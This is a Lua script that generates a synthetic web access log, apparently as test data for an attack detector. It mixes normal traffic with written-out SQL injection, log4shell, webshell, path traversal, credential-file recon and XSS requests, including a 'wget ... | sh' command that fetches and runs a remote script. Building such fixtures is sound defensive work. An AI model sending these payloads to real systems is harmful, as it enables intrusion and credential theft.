-- Builds examples/access.log: a deterministic synthetic log (documentation IP ranges).
local out, n = {}, 0
local function line(ip, path, status, ua, method)
  n = n + 1
  local sec = n % 60
  out[#out + 1] = string.format('%s - - [14/Mar/2026:10:%02d:%02d +0000] "%s %s HTTP/1.1" %d %d "-" "%s"', ip, (n // 60) % 60, sec, method or "GET", path, status, 200 + n % 900, ua)
end
local BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
local pages = { "/", "/products", "/products/42", "/about", "/contact", "/static/app.css", "/static/app.js", "/blog/launch" }
for i = 1, 120 do line("198.51.100." .. (10 + i % 8), pages[i % #pages + 1], (i % 17 == 0) and 304 or 200, BROWSER) end
-- sqlmap run
for _, p in ipairs({ "/products?id=1'%20OR%20'1'='1", "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", "/products?id=1;SELECT%20SLEEP(5)", "/products?id=1%20AND%20extractvalue(1,concat(0x7e,version()))", "/search?q=information_schema.tables" }) do line("203.0.113.9", p, 500, "sqlmap/1.7.2#stable (https://sqlmap.org)") end
-- log4shell and webshell probing
line("192.0.2.77", "/?x=${jndi:ldap://203.0.113.200/a}", 400, BROWSER)
line("192.0.2.77", "/shell.php?cmd=id", 404, BROWSER)
line("192.0.2.77", "/upload/x.php?cmd=wget%20http://203.0.113.200/m.sh%20|%20sh", 404, BROWSER)
line("192.0.2.77", "/index.php?exec=/bin/sh", 404, BROWSER)
-- traversal with double encoding
line("192.0.2.31", "/download?file=../../../../etc/passwd", 403, BROWSER)
line("192.0.2.31", "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", 403, BROWSER)
line("192.0.2.31", "/static/..%2f..%2f..%2fetc/shadow", 403, BROWSER)
-- recon and error storm from a scanner
for _, p in ipairs({ "/.env", "/.git/config", "/phpmyadmin/", "/server-status", "/actuator/env", "/.aws/credentials", "/xmlrpc.php" }) do line("198.51.100.99", p, 404, "Mozilla/5.0 (compatible; Nuclei - Open-source project)") end
for i = 1, 30 do line("198.51.100.99", "/wp-content/plugins/p" .. i .. "/readme.txt", 404, "Mozilla/5.0 (compatible; Nuclei - Open-source project)") end
-- XSS probe
line("192.0.2.140", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, BROWSER)
line("192.0.2.140", "/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E", 200, BROWSER)
-- a legitimate user with a quote in a search (should not be flagged)
line("198.51.100.55", "/search?q=it's+a+test", 200, BROWSER)
local f = assert(io.open(arg[1] or "examples/access.log", "w")); f:write(table.concat(out, "\n"), "\n"); f:close()
